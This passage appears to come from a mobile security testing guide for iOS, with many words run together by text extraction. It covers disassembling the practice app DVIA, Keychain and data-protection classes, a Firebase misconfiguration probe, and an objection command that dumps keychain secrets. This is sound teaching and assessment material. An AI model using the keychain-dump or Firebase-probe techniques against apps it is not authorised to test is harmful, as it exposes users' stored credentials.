“fat bi- nary”. OneexampleistheDamnVulnerableiOSAppDVIAv1todemonstratethis. Unziptheappandrunotool: unzip DamnVulnerableiOSApp.ipa cdPayload/DamnVulnerableIOSApp.app otool -hvDamnVulnerableIOSApp Theoutputwilllooklikethis: DamnVulnerableIOSApp (architecturearmv7): Machheader magic cputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC ARM V7 0x00 EXECUTE 33 3684 NOUNDEFSDYLDLINKTWOLEVELPIE DamnVulnerableIOSApp (architecturearm64): Machheader magic cputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC_64 ARM64 ALL 0x00 EXECUTE 33 4192 NOUNDEFSDYLDLINKTWOLEVELPIE Toeasetheappanalysis,it’srecommendedcreateaso-calledthinbinary,whichcontainsonearchitectureonly: lipo -thin armv7DamnVulnerableIOSApp -output DVIA32 Execution Tracing Platform: ios Tracinginvolvesrecordingtheinformationaboutaprogram’sexecution. IncontrasttoAndroid,therearelimitedoptions available for tracing various aspects of an iOS app. In this section we will be heavily relying on tools such as Frida for performingtracing. TODO:Thisneedstobeimprovedaswell Reviewing Disassembled Native Code Platform: ios Analyzingdisassemblednativecoderequiresagoodunderstandingofthecallingconventionsandinstructionsusedby theunderlyingplatform. InthissectionwearelookinginARM64disassemblyofthenativecode. Agoodstartingpointto learnaboutARMarchitectureisavailableatIntroductiontoARMAssemblyBasicsbyAzeriaLabsTutorials. Thisisaquick summaryofthethingsthatwewillbeusinginthissection: • InARM64,aregisterisof64bitinsizeandreferredtoasXn,wherenisanumberfrom0to31. Ifthelower(LSB) 32bitsoftheregisterareusedthenit’sreferredtoasWn. • TheinputparameterstoafunctionarepassedintheX0-X7registers. • ThereturnvalueofthefunctionispassedviatheX0register. 394\n• Load(LDR)andstore(STR)instructionsareusedtoreadorwritetomemoryfrom/toaregister. • B,BL,BLXarebranchinstructionsusedforcallingafunction. As mentioned above as well, Objective-C code is also compiled to native binary code, but analyzing C/C++ native can bemorechallenging. IncaseofObjective-Ctherearevarioussymbols(especiallyfunctionnames)present,whicheases the understanding of the code. In the above section we’ve learned that the presence of function names like setText, isEqualStringscanhelpusinquicklyunderstandingthesemanticsofthecode. IncaseofC/C++nativecode,ifallthe binariesarestripped,therecanbeveryfewornosymbolspresenttoassistusintoanalyzingit. Decompilerscanhelpusinanalyzingnativecode, buttheyshouldbeusedwithcaution. Moderndecompilersarevery sophisticatedandamongmanytechniquesusedbythemtodecompilecode,afewofthemareheuristicsbased. Heuristics basedtechniquesmightnotalwaysgivecorrectresults,onesuchcasebeing,determiningthenumberofinputparameters for a given native function. Having knowledge of analyzing disassembled code, assisted with decompilers can make analyzingnativecodelesserrorprone. WewillbeanalyzingthenativefunctionidentifiedinviewDidLoadfunctionintheprevioussection. Thefunctionislocated atoffset0x1000080d4. ThereturnvalueofthisfunctionusedinthesetTextfunctioncallforthelabel. Thistextisused tocompareagainsttheuserinput. Thus,wecanbesurethatthisfunctionwillbereturningastringorequivalent. Thefirstthingwecanseeinthedisassemblyofthefunctionisthatthereisnoinputtothefunction. TheregistersX0-X7 are not read throughout the function. Also, there are multiple calls to other functions like the ones at 0x100008158, 0x10000dbf0etc. Theinstructionscorrespondingtoonesuchfunctioncallscanbeseenbelow. Thebranchinstructionblisusedtocallthe functionat0x100008158. 395\n1000080f01a 000094 bl FUN_100008158 1000080f4 60020039 strb w0,[x19]=>DAT_10000dbf0 Thereturnvaluefromthefunction(foundinW0),isstoredtotheaddressinregisterX19(strbstoresabytetotheaddress inregister). Wecanseethesamepatternforotherfunctioncalls,thereturnedvalueisstoredinX19registerandeach timetheoffsetisonemorethanthepreviousfunctioncall. Thisbehaviorcanbeassociatedwithpopulatingeachindex ofastringarrayatatime. Eachreturnvalueisbeenwrittentoanindexofthisstringarray. Thereare11suchcalls,and fromthecurrentevidencewecanmakeanintelligentguessthatlengthofthehiddenflagis11. Towardstheendofthe disassembly,thefunctionreturnswiththeaddresstothisstringarray. 100008148 e00313aa mov x0=>DAT_10000dbf0,x19 To determine the value of the hidden flag we need to know the return value of each of the subsequent function calls identifiedabove. Whenanalyzingthefunction0x100006fb4,wecanobservethatthisfunctionismuchbiggerandmore complexthanthepreviousoneweanalyzed. Functiongraphscanbeveryhelpfulwhenanalyzingcomplexfunctions,as ithelpsintobetterunderstandingthecontrolflowofthefunction. FunctiongraphscanbeobtainedinGhidrabyclicking theDisplayfunctiongraphiconinthesub-menu. Manuallyanalyzingallthenativefunctionscompletelywillbetimeconsumingandmightnotbethewisestapproach. In suchascenario usinga dynamicanalysis approachishighly recommended. Forinstance, by usingthe techniqueslike 396\nhookingorsimplydebuggingtheapplication,wecaneasilydeterminethereturnedvalues. Normallyit’sagoodideato useadynamicanalysisapproachandthenfallbacktomanuallyanalyzingthefunctionsinafeedbackloop. Thiswayyou canbenefitfrombothapproachesatthesametimewhilesavingtimeandreducingeffort. Dynamicanalysistechniques arediscussedin“DynamicAnalysis”section. 397\niOS Data Storage Overview Theprotectionofsensitivedata,suchasauthenticationtokensandprivateinformation,iskeyformobilesecurity. Inthis chapter,you’lllearnabouttheiOSAPIsforlocaldatastorage,andbestpracticesforusingthem. As little sensitive data as possible should be saved in permanent local storage. However, in most practical scenarios, atleastsomeuserdatamustbestored. Fortunately,iOSofferssecurestorageAPIs,whichallowdeveloperstousethe cryptographichardwareavailableoneveryiOS device. IftheseAPIs areusedcorrectly, sensitivedataand filescanbe securedviahardware-backed256-bitAESencryption. NSData and NSMutableData NSData(staticdataobjects)andNSMutableData(dynamicdataobjects)aretypicallyusedfordatastorage,buttheyare alsousefulfordistributedobjectsapplications,inwhichdatacontainedindataobjectscanbecopiedormovedbetween applications. ThefollowingaremethodsusedtowriteNSDataobjects: • NSDataWritingWithoutOverwriting • NSDataWritingFileProtectionNone • NSDataWritingFileProtectionComplete • NSDataWritingFileProtectionCompleteUnlessOpen • NSDataWritingFileProtectionCompleteUntilFirstUserAuthentication • writeToFile: storesdataaspartoftheNSDataclass • NSSearchPathForDirectoriesInDomains, NSTemporaryDirectory: usedtomanagefilepaths • NSFileManager: letsyouexamineandchangethecontentsofthefilesystem. YoucanusecreateFileAtPathto createafileandwritetoit. ThefollowingexampleshowshowtocreateacompleteencryptedfileusingtheFileManagerclass. Youcanfindmore informationintheAppleDeveloperDocumentation“EncryptingYourApp’sFiles” Swift: FileManager.default.createFile( atPath:filePath, contents:"secrettext".data(using:.utf8), attributes:[FileAttributeKey.protectionKey:FileProtectionType.complete] ) Objective-C: [[NSFileManagerdefaultManager]createFileAtPath:[self filePath] contents:[@"secrettext" dataUsingEncoding:NSUTF8StringEncoding] attributes:[NSDictionarydictionaryWithObject:NSFileProtectionComplete forKey:NSFileProtectionKey]]; NSUserDefaults TheNSUserDefaultsclassprovidesaprogrammaticinterfaceforinteractingwiththedefaultsystem. Thedefaultsystem allows an application to customize its behavior according to user preferences. Data saved by NSUserDefaults can be viewed in the application bundle. This class stores data in a plist file, but it’s meant to be used with small amounts of data. Databases CoreData 398\nCoreDataisaframeworkformanagingthemodellayerofobjectsinyourapplication. Itprovidesgeneralandautomated solutionstocommontasksassociatedwithobjectlifecyclesandobjectgraphmanagement,includingpersistence. Core DatacanuseSQLiteasitspersistentstore,buttheframeworkitselfisnotadatabase. CoreDatadoesnotencryptit’sdatabydefault. Aspartofaresearchproject(iMAS)fromtheMITRECorporation,thatwas focusedonopensourceiOSsecuritycontrols,anadditionalencryptionlayercanbeaddedtoCoreData. SeetheGitHub Repoformoredetails. SQLite Databases TheSQLite3librarymustbeaddedtoanappiftheappistouseSQLite. ThislibraryisaC++wrapperthatprovidesan APIfortheSQLitecommands. Firebase Real-time Databases Firebaseisadevelopmentplatformwithmorethan15products,andoneofthemisFirebaseReal-timeDatabase. Itcan beleveragedbyapplicationdeveloperstostoreandsyncdatawithaNoSQLcloud-hosteddatabase. Thedataisstored asJSONandissynchronizedinreal-timetoeveryconnectedclientandalsoremainsavailableevenwhentheapplication goesoffline. AmisconfiguredFirebaseinstancecanbeidentifiedbymakingthefollowingnetworkcall: https://\<firebaseProjectName\>.firebaseio.com/.json The firebaseProjectName can be retrieved from the property list(.plist) file. For example, PROJECT_ID key stores the correspondingFirebaseprojectnameinGoogleService-Info.plistfile. Alternatively,theanalystscanuseFirebaseScanner,apythonscriptthatautomatesthetaskaboveasshownbelow: pythonFirebaseScanner.py -f<commaSeparatedFirebaseProjectNames> Realm Databases Realm Objective-C and Realm Swift aren’t supplied by Apple, but they are still worth noting. They store everything unencrypted,unlesstheconfigurationhasencryptionenabled. ThefollowingexampledemonstrateshowtouseencryptionwithaRealmdatabase: //OpentheencryptedRealmfilewheregetKey()isamethodtoobtainakeyfromtheKeychainora server letconfig =Realm.Configuration(encryptionKey:getKey()) do{ letrealm =tryRealm(configuration:config) //UsetheRealmasnormal }catch leterror asNSError { //Iftheencryptionkeyiswrong,`error`willsaythatit'saninvaliddatabase fatalError("Erroropeningrealm: \(error)") } Couchbase Lite Databases CouchbaseLiteisalightweight,embedded,document-oriented(NoSQL)databaseenginethatcanbesynced. Itcompiles nativelyforiOSandmacOS. YapDatabase YapDatabaseisakey/valuestorebuiltontopofSQLite. 399\nUser Interface UI Components Entering sensitive information when, for example, registering an account or making payments, is an essential part of usingmanyapps. Thisdatamaybefinancialinformationsuchascreditcarddataoruseraccountpasswords. Thedata maybeexposediftheappdoesn’tproperlymaskitwhileitisbeingtyped. In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be presentitshouldbeproperlymasked,typicallybyshowingasterisksordotsinsteadofcleartext. CarefullyreviewallUIcomponentsthateithershowsuchinformationortakeitasinput. Searchforanytracesofsensitive informationandevaluateifitshouldbemaskedorcompletelyremoved. Screenshots Manufacturerswanttoprovidedeviceuserswithanaestheticallypleasingeffectwhenanapplicationisstartedorexited, so they introduced the concept of saving a screenshot when the application goes into the background. This feature can pose a security risk because screenshots (which may display sensitive information such as an email or corporate documents) are written to local storage, where they can be recovered by a rogue application with a sandbox bypass exploitorsomeonewhostealsthedevice. Keyboard Cache Severaloptions,suchasautocorrectandspellcheck,areavailabletouserstosimplifykeyboardinputandarecachedby defaultin.datfilesin/private/var/mobile/Library/Keyboard/anditssubdirectories. The UITextInputTraits protocol is used for keyboard caching. The UITextField, UITextView, and UISearchBar classes automaticallysupportthisprotocolanditoffersthefollowingproperties: • varautocorrectionType:UITextAutocorrectionTypedetermineswhetherautocorrectionisenabledduringtyp- ing. When autocorrection is enabled, the text object tracks unknown words and suggests suitable replacements, replacingthetypedtextautomaticallyunlesstheuseroverridesthereplacement. Thedefaultvalueofthisproperty isUITextAutocorrectionTypeDefault,whichformostinputmethodsenablesautocorrection. • var secureTextEntry: BOOL determines whether text copying and text caching are disabled and hides the text beingenteredforUITextField. ThedefaultvalueofthispropertyisNO. Internal Storage Data Protection API AppdeveloperscanleveragetheiOSDataProtectionAPIstoimplementfine-grainedaccesscontrolforuserdatastored inflashmemory. TheAPIsarebuiltontopoftheSecureEnclaveProcessor(SEP),whichwasintroducedwiththeiPhone 5S.TheSEPisacoprocessorthatprovidescryptographicoperationsfordataprotectionandkeymanagement. Adevice- specifichardwarekey-thedeviceUID(UniqueID)-isembeddedinthesecureenclave,ensuringtheintegrityofdatapro- tectionevenwhentheoperatingsystemkerneliscompromised. YoucanlearnmoreabouttheSecureEnclaveinthisBlackHatpresentation“DemystifyingtheSecureEnclavePro- cessor”byTarjeiMandt,MathewSolnikandDavidWang. Thedataprotectionarchitectureisbasedonahierarchyofkeys. TheUIDandtheuserpasscodekey(whichisderivedfrom theuser’spassphraseviathePBKDF2algorithm)sitatthetopofthishierarchy. Together,theycanbeusedto“unlock” so-calledclasskeys,whichareassociatedwithdifferentdevicestates(e.g.,devicelocked/unlocked). EveryfilestoredontheiOSfilesystemisencryptedwithitsownper-filekey,whichiscontainedinthefilemetadata. The metadataisencryptedwiththefilesystemkeyandwrappedwiththeclasskeycorrespondingtotheprotectionclassthe appselectedwhencreatingthefile. ThefollowingillustrationshowstheiOSDataProtectionKeyHierarchy. 400\nFiles can be assigned to one of four different protection classes, which are explained in more detail in theiOS Security Guide: • CompleteProtection(NSFileProtectionComplete): AkeyderivedfromtheuserpasscodeandthedeviceUID protectsthisclasskey. Thederivedkeyiswipedfrommemoryshortlyafterthedeviceislocked,makingthedata inaccessibleuntiltheuserunlocksthedevice. • ProtectedUnlessOpen(NSFileProtectionCompleteUnlessOpen): ThisprotectionclassissimilartoComplete Protection,but,ifthefileisopenedwhenunlocked,theappcancontinuetoaccessthefileeveniftheuserlocks thedevice. Thisprotectionclassisusedwhen,forexample,amailattachmentisdownloadinginthebackground. • Protected Until First User Authentication (NSFileProtectionCompleteUntilFirstUserAuthentication): Thefilecanbeaccessedassoonastheuserunlocksthedeviceforthefirsttimeafterbooting. Itcanbeaccessed eveniftheusersubsequentlylocksthedeviceandtheclasskeyisnotremovedfrommemory. • No Protection (NSFileProtectionNone): The key for this protection class is protected with the UID only. The class key is stored in “Effaceable Storage”, which is a region of flash memory on the iOS device that allows the storage of small amounts of data. This protection class exists for fast remote wiping (immediate deletion of the classkey,whichmakesthedatainaccessible). AllclasskeysexceptNSFileProtectionNoneareencryptedwithakeyderivedfromthedeviceUIDandtheuser’spass- code. Asaresult,decryptioncanhappenonlyonthedeviceitselfandrequiresthecorrectpasscode. SinceiOS7,thedefaultdataprotectionclassis“ProtectedUntilFirstUserAuthentication”. External Storage The Keychain TheiOSKeychaincanbeusedtosecurelystoreshort,sensitivebitsofdata,suchasencryptionkeysandsessiontokens. ItisimplementedasanSQLitedatabasethatcanbeaccessedthroughtheKeychainAPIsonly. OnmacOS,everyuserapplicationcancreateasmanyKeychainsasdesired,andeveryloginaccounthasitsownKeychain. ThestructureoftheKeychainoniOSisdifferent: onlyoneKeychainisavailabletoallapps. Accesstotheitemscanbe sharedbetweenappssignedbythesamedeveloperviatheaccessgroupsfeatureoftheattributekSecAttrAccessGroup. Access to the Keychain is managed by the securityd daemon, which grants access according to the app’s Keychain- access-groups,application-identifier,andapplication-groupentitlements. TheKeychainAPIincludesthefollowingmainoperations: • SecItemAdd • SecItemUpdate • SecItemCopyMatching • SecItemDelete 401\nDatastoredintheKeychainisprotectedviaaclassstructurethatissimilartotheclassstructureusedforfileencryption. ItemsaddedtotheKeychainareencodedasabinaryplistandencryptedwitha128-bitAESper-itemkeyinGalois/Counter Mode(GCM).Notethatlargerblobsofdataaren’tmeanttobesaveddirectlyintheKeychain-that’swhattheDataProtec- tionAPIisfor. YoucanconfiguredataprotectionforKeychainitemsbysettingthekSecAttrAccessiblekeyinthecallto SecItemAddorSecItemUpdate. ThefollowingconfigurableaccessibilityvaluesforkSecAttrAccessiblearetheKeychain DataProtectionclasses: • kSecAttrAccessibleAlways: The data in the Keychain item can always be accessed, regardless of whether the deviceislocked. • kSecAttrAccessibleAlwaysThisDeviceOnly: ThedataintheKeychainitemcanalwaysbeaccessed,regardless ofwhetherthedeviceislocked. Thedatawon’tbeincludedinaniCloudorlocalbackup. • kSecAttrAccessibleAfterFirstUnlock: ThedataintheKeychainitemcan’tbeaccessedafterarestartuntilthe devicehasbeenunlockedoncebytheuser. • kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly: The data in the Keychainitem can’t be accessed after a restart until the device has been unlocked once by the user. Items with this attribute do not migrate to a new device. Thus,afterrestoringfromabackupofadifferentdevice,theseitemswillnotbepresent. • kSecAttrAccessibleWhenUnlocked: The data in the Keychain item can be accessed only while the device is un- lockedbytheuser. • kSecAttrAccessibleWhenUnlockedThisDeviceOnly: The data in the Keychain item can be accessed only while thedeviceisunlockedbytheuser. Thedatawon’tbeincludedinaniCloudorlocalbackup. • kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly: ThedataintheKeychaincanbeaccessedonlywhenthe device is unlocked. This protection class is only available if a passcode is set on the device. The data won’t be includedinaniCloudorlocalbackup. AccessControlFlags define the mechanisms with which users can authenticate the key (SecAccessControlCreate- Flags): • kSecAccessControlDevicePasscode: Accesstheitemviaapasscode. • kSecAccessControlBiometryAny: Access the item via one of the fingerprints registered to Touch ID. Adding or removingafingerprintwon’tinvalidatetheitem. • kSecAccessControlBiometryCurrentSet:AccesstheitemviaoneofthefingerprintsregisteredtoTouchID.Adding orremovingafingerprintwillinvalidatetheitem. • kSecAccessControlUserPresence: Accesstheitemviaeitheroneoftheregisteredfingerprints(usingTouchID)or defaulttothepasscode. Please note that keys secured by Touch ID (via kSecAccessControlBiometryAny or kSecAccessControlBiometryCur- rentSet)areprotectedbytheSecureEnclave: TheKeychainholdsatokenonly,nottheactualkey. Thekeyresidesin theSecureEnclave. StartingwithiOS9,youcandoECC-basedsigningoperationsintheSecureEnclave. Inthatscenario,theprivatekeyand thecryptographicoperationsresidewithintheSecureEnclave. Seethestaticanalysissectionformoreinfooncreating theECCkeys. iOS9supportsonly256-bitECC.Furthermore,youneedtostorethepublickeyintheKeychainbecauseit can’tbestoredintheSecureEnclave. Afterthekeyiscreated,youcanusethekSecAttrKeyTypetoindicatethetypeof algorithmyouwanttousethekeywith. In case you want to use these mechanisms, it is recommended to test whether the passcode has been set. In iOS 8, you will need to check whether you can read/write from an item in the Keychain protected by the kSecAttrAccessi- bleWhenPasscodeSetThisDeviceOnly attribute. From iOS 9 onward you can check whether a lock screen is set, using LAContext: Swift: public func devicePasscodeEnabled()->Bool { return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication,error:nil) } Objective-C: -(BOOL)devicePasscodeEnabled:(LAContext)context{ if([contextcanEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationerror:nil]) { return true; }else { return false; } } 402\nHere is sample Swift code you can use to create keys (Notice the kSecAttrTokenID as String: kSecAttrTokenIDSe- cureEnclave: thisindicatesthatwewanttousetheSecureEnclavedirectly.): //privatekeyparameters letprivateKeyParams =[ kSecAttrLabel asString:"privateLabel", kSecAttrIsPermanent asString:true, kSecAttrApplicationTag asString:"applicationTag", ]asCFDictionary //publickeyparameters letpublicKeyParams =[ kSecAttrLabel asString:"publicLabel", kSecAttrIsPermanent asString:false, kSecAttrApplicationTag asString:"applicationTag", ]asCFDictionary //globalparameters letparameters =[ kSecAttrKeyType asString:kSecAttrKeyTypeEC, kSecAttrKeySizeInBits asString:256, kSecAttrTokenID asString:kSecAttrTokenIDSecureEnclave, kSecPublicKeyAttrs asString:publicKeyParams, kSecPrivateKeyAttrs asString:privateKeyParams, ]asCFDictionary varpubKey,privKey:SecKey? letstatus =SecKeyGeneratePair(parameters,&pubKey,&privKey) ifstatus !=errSecSuccess { //Keyscreatedsuccessfully } Keychain Data Persistence OniOS,whenanapplicationisuninstalled,theKeychaindatausedbytheapplicationisretainedbythedevice,unlikethe datastoredbytheapplicationsandboxwhichiswiped. Intheeventthatausersellstheirdevicewithoutperforminga factoryreset,thebuyerofthedevicemaybeabletogainaccesstotheprevioususer’sapplicationaccountsanddataby reinstallingthesameapplicationsusedbytheprevioususer. Thiswouldrequirenotechnicalabilitytoperform. When assessing an iOS application, you should look for Keychain data persistence. This is normally done by using the application to generate sample data that may be stored in the Keychain, uninstalling the application, then reinstalling the application to see whether the data was retained between application installations. Use objection runtime mobile explorationtoolkittodumpthekeychaindata. Thefollowingobjectioncommanddemonstratesthisprocedure: ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #ioskeychaindump Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ------------------------- ------------------------------ ----- -------- ------------------------- ↪ ------------------------------------------------------------- ------------------------------------ 2020-02-1113:26:52+0000 WhenUnlocked None Password keychainValue com.highaltitudehacks.DVIAswiftv2.develop ↪ mysecretpass123 There’s no iOS API that developers can use to force wipe data when an application is uninstalled. Instead, developers shouldtakethefollowingstepstopreventKeychaindatafrompersistingbetweenapplicationinstallations: • Whenanapplicationisfirstlaunchedafterinstallation,wipeallKeychaindataassociatedwiththeapplication. This willpreventadevice’sseconduserfromaccidentallygainingaccesstotheprevioususer’saccounts. Thefollowing Swiftexampleisabasicdemonstrationofthiswipingprocedure: letuserDefaults =UserDefaults.standard ifuserDefaults.bool(forKey:"hasRunBefore")==false { //RemoveKeychainitemshere //Updatetheflagindicator userDefaults.set(true,forKey:"hasRunBefore") } • WhendevelopinglogoutfunctionalityforaniOSapplication,makesurethattheKeychaindataiswipedaspartof accountlogout. Thiswillallowuserstocleartheiraccountsbeforeuninstallinganapplication. 403\nLogs Therearemanylegitimatereasonsforcreatinglogfilesonamobiledevice,includingkeepingtrackofcrashesorerrors thatarestoredlocallywhilethedeviceisoffline(sothattheycanbesenttotheapp’sdeveloperonceonline),andstoring usagestatistics. However,loggingsensitivedata,suchascreditcardnumbersandsessioninformation,mayexposethe datatoattackersormaliciousapplications. Logfilescanbecreatedinseveralways. Thefollowinglistshowsthemethods availableoniOS: • NSLogMethod • printf-likefunction • NSAssert-likefunction • Macro Backups iOSincludesauto-backupfeaturesthatcreatecopiesofthedatastoredonthedevice. YoucanmakeiOSbackupsfrom your host computer by using iTunes (till macOS Catalina) or Finder (from macOS Catalina onwards), or via the iCloud backupfeature. Inbothcases,thebackupincludesnearlyalldatastoredontheiOSdeviceexcepthighlysensitivedata suchasApplePayinformationandTouchIDsettings. SinceiOSbacksupinstalledappsandtheirdata,anobviousconcerniswhethersensitiveuserdatastoredbytheappmight unintentionallyleakthroughthebackup. Anotherconcern,thoughlessobvious,iswhethersensitiveconfigurationsettings used to protect data or restrict app functionality could be tampered to change app behavior after restoring a modified backup. Bothconcernsarevalidandthesevulnerabilitieshaveproventoexistinavastnumberofappstoday. How the Keychain Is Backed Up When users back up their iOS device, the Keychain data is backed up as well, but the secrets in the Keychain remain encrypted. TheclasskeysnecessarytodecrypttheKeychaindataaren’tincludedinthebackup. RestoringtheKeychain datarequiresrestoringthebackuptoadeviceandunlockingthedevicewiththeuserspasscode. KeychainitemsforwhichthekSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attributeissetcanbedecrypted only if the backup is restored to the backed up device. Someone trying to extract this Keychain data from the backup couldn’tdecryptitwithoutaccesstothecryptohardwareinsidetheoriginatingdevice. One caveat to using the Keychain, however, is that it was only designed to store small bits of user data or short notes (accordingtoApple’sdocumentationonKeychainServices). Thismeansthatappswithlargerlocalsecurestorageneeds (e.g.,messagingapps,etc.) shouldencryptthedatawithintheappcontainer,butusetheKeychaintostorekeymaterial. Incaseswheresensitiveconfigurationsettings(e.g.,datalosspreventionpolicies,passwordpolicies,compliancepolicies, etc)mustremainunencryptedwithintheappcontainer,youcanconsiderstoringahashofthepoliciesinthekeychain for integrity checking. Without an integrity check, these settings could be modified within a backup and then restored backtothedevicetomodifyappbehavior(e.g.,changeconfiguredremoteendpoints)orsecuritysettings(e.g.,jailbreak detection,certificatepinning,maximumUIloginattempts,etc.). The takeaway: If sensitive data is handled as recommended earlier in this chapter (e.g., stored in the Keychain, with Keychainbackedintegritychecks,orencryptedwithakeythat’slockedinsidetheKeychain),backupsshouldn’tbesecurity issue. Process Memory Analyzingmemorycanhelpdeveloperstoidentifytherootcausesofproblemssuchasapplicationcrashes. However,it canalsobeusedtoaccesstosensitivedata. Thissectiondescribeshowtocheckprocess’memoryfordatadisclosure. First,identifythesensitiveinformationthat’sstoredinmemory. Sensitiveassetsareverylikelytobeloadedintomemory atsomepoint. Theobjectiveistomakesurethatthisinfoisexposedasbrieflyaspossible. Toinvestigateanapplication’smemory,firstcreateamemorydump. Alternatively,youcananalyzethememoryinreal timewith,forexample,adebugger. Regardlessofthemethodyouuse,thisisaveryerror-proneprocessbecausedumps provide the data left by executed functions and you might miss executing critical steps. In addition, overlooking data duringanalysisisquiteeasytodounlessyouknowthefootprintofthedatayou’relookingfor(eitheritsexactvalueor 404\nitsformat). Forexample,iftheappencryptsaccordingtoarandomlygeneratedsymmetrickey,you’reveryunlikelyto spotthekeyinmemoryunlessyoufinditsvaluebyothermeans. Before looking into the source code, checking the documentation and identifying application components provide an overviewofwheredatamightbeexposed. Forexample,whilesensitivedatareceivedfromabackendexistsinthefinal model object, multiple copies may also existin the HTTPclient or the XML parser. All these copies should be removed frommemoryassoonaspossible. Understanding the application’s architecture and its interaction with the OS will help you identify sensitive information that doesn’t have to be exposed in memory at all. For example, assume your app receives data from one server and transfersittoanotherwithoutneedinganyadditionalprocessing. Thatdatacanbereceivedandhandledinencrypted form,whichpreventsexposureviamemory. However,ifsensitivedatadoesneedtobeexposedviamemory,makesurethatyourappexposesasfewcopiesofthis dataaspossibleforaslittletimeaspossible. Inotherwords,youwantcentralizedhandlingofsensitivedata,basedon primitiveandmutabledatastructures. Suchdatastructuresgivedevelopersdirectaccesstomemory. Makesurethatthisaccessisusedtooverwritethesensitive data and cryptographic keys with zeroes. Apple Secure Coding Guide suggests zeroing sensitive data after usage, but providesnorecommendedwaysofdoingthis. Examplesofpreferabledatatypesincludechar []andint [],butnotNSStringorString. Wheneveryoutrytomodify animmutableobject,suchasaString,youactuallycreateacopyandchangethecopy. ConsiderusingNSMutableData forstoringsecretsonSwift/Objective-CanduseresetBytes(in:) methodforzeroing. Also,seeCleanmemoryofsecret dataforreference. AvoidSwiftdatatypesotherthancollectionsregardlessofwhethertheyareconsideredmutable. ManySwiftdatatypes holdtheirdatabyvalue,notbyreference. Althoughthisallowsmodificationofthememoryallocatedtosimpletypeslike charandint,handlingacomplextypesuchasStringbyvalueinvolvesahiddenlayerofobjects,structures,orprimitive arrayswhosememorycan’tbedirectlyaccessedormodified. Certaintypesofusagemayseemtocreateamutabledata object (and even be documented as doing so), but they actually create a mutable identifier (variable) instead of an immutableidentifier(constant). Forexample,manythinkthatthefollowingresultsinamutableStringinSwift,butthis isactuallyanexampleofavariablewhosecomplexvaluecanbechanged(replaced,notmodifiedinplace): varstr1 ="Goodbye" //"Goodbye",baseaddress: 0x0001039e8dd0 str1.append("") //"Goodbye",baseaddress: 0x608000064ae0 str1.append("cruelworld!") //"Goodbyecruelworld",baseaddress:0x6080000338a0 str1.removeAll() //"",baseaddress 0x00010bd66180 Noticethatthebaseaddressoftheunderlyingvaluechangeswitheachstringoperation. Hereistheproblem: Tosecurely erase the sensitive information from memory, we don’t want to simply change the value of the variable; we want to changetheactualcontentofthememoryallocatedforthecurrentvalue. Swiftdoesn’toffersuchafunction. Swiftcollections(Array,Set,andDictionary),ontheotherhand,maybeacceptableiftheycollectprimitivedatatypes suchascharorintandaredefinedasmutable(i.e.,asvariablesinsteadofconstants),inwhichcasetheyaremoreor lessequivalenttoaprimitivearray(suchaschar []). Thesecollectionsprovidememorymanagement,whichcanresult inunidentifiedcopiesofthesensitivedatainmemoryifthecollectionneedstocopytheunderlyingbuffertoadifferent locationtoextendit. UsingmutableObjective-Cdatatypes,suchasNSMutableString,mayalsobeacceptable,butthesetypeshavethesame memory issue as Swift collections. Pay attention when using Objective-C collections; they hold data by reference, and onlyObjective-Cdatatypesareallowed. Therefore,wearelooking,notforamutablecollection,butforacollectionthat referencesmutableobjects. Aswe’veseensofar,usingSwiftorObjective-Cdatatypesrequiresadeepunderstandingofthelanguageimplementa- tion. Furthermore,therehasbeensomecorere-factoringinbetweenmajorSwiftversions,resultinginmanydatatypes’ behaviorbeingincompatiblewiththatofothertypes. Toavoidtheseissues,werecommendusingprimitivedatatypes wheneverdataneedstobesecurelyerasedfrommemory. Unfortunately, few libraries and frameworks are designed to allow sensitive data to be overwritten. Not even Apple considersthisissueintheofficialiOSSDKAPI.Forexample,mostoftheAPIsfordatatransformation(passers,serializes, etc.) operateonnon-primitivedatatypes. Similarly, regardlessofwhetheryouflagsomeUITextFieldasSecureText Entryornot,italwaysreturnsdataintheformofaStringorNSString. 405\nIPC InterProcessCommunication(IPC)allowsprocessestosendeachothermessagesanddata. Forprocessesthatneedto communicatewitheachother,therearedifferentwaystoimplementIPConiOS: • XPC Services: XPC is a structured, asynchronous library that provides basic interprocess communication. It is managedbylaunchd. ItisthemostsecureandflexibleimplementationofIPConiOSandshouldbethepreferred method. It runs in the most restricted environment possible: sandboxed with no root privilege escalation and minimalfilesystemaccessandnetworkaccess. TwodifferentAPIsareusedwithXPCServices: – NSXPCConnectionAPI – XPCServicesAPI • MachPorts: AllIPCcommunicationultimatelyreliesontheMachKernelAPI.MachPortsallowlocalcommunication (intra-devicecommunication)only. TheycanbeimplementedeithernativelyorviaCoreFoundation(CFMachPort) andFoundation(NSMachPort)wrappers. • NSFileCoordinator: TheclassNSFileCoordinatorcanbeusedtomanageandsenddatatoandfromappsvia filesthatareavailableonthelocalfilesystemtovariousprocesses. NSFileCoordinatormethodsrunsynchronously, so your code will be blocked until they stop executing. That’s convenient because you don’t have to wait for an asynchronousblockcallback,butitalsomeansthatthemethodsblocktherunningthread. Checking Logs for Sensitive Data Platform: ios MASVSV1: MSTG-STORAGE-3 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Usethefollowingkeywordstochecktheapp’ssourcecodeforpredefinedandcustomloggingstatements: • Forpredefinedandbuilt-infunctions: – NSLog – NSAssert – NSCAssert – fprintf • Forcustomfunctions: – Logging – Logfile AgeneralizedapproachtothisissueistouseadefinetoenableNSLogstatementsfordevelopmentanddebugging,then disablethembeforeshippingthesoftware. YoucandothisbyaddingthefollowingcodetotheappropriatePREFIX_HEADER (*.pch)file: ##ifdefDEBUG ## defineNSLog(...)NSLog(__VA_ARGS__) ##else ## defineNSLog(...) ##endif Dynamic Analysis In the section “Monitoring System Logs” of the chapter “iOS Basic Security Testing” various methods for checking the devicelogsareexplained. Navigatetoascreenthatdisplaysinputfieldsthattakesensitiveuserinformation. After starting one of the methods, fill in the input 